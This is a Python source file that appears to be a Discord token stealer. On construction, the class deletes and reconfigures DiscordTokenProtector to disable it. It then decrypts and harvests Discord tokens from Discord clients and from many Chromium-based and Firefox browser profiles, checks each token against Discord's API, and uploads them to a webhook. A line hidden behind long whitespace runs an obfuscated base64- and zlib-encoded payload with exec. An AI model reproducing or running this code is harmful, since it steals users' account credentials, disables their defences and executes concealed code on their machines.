import base64
import json
import os
import re
import requests
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData

class Discord:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []

        self.killprotector()
        self.grabTokens()
        self.upload(__CONFIG__["webhook"])


    def killprotector(self):
        path = f"{self.roaming}\\DiscordTokenProtector"
        config = path + "config.json"
    
        if not os.path.exists(path):
            return
    
        for process in ["\\DiscordTokenProtector.exe", "\\ProtectionPayload.dll", "\\secure.dat"]:
            try:
                os.remove(path + process)
            except FileNotFoundError:
                pass
    
        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
    
            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
  
    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\',
            'Vesktop': self.roaming + '\\vesktop\\sessionData\\Local Storage\\leveldb\\'
            }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)
                                                                                                                                                                                        _                                                                                                                                                                                                                                           = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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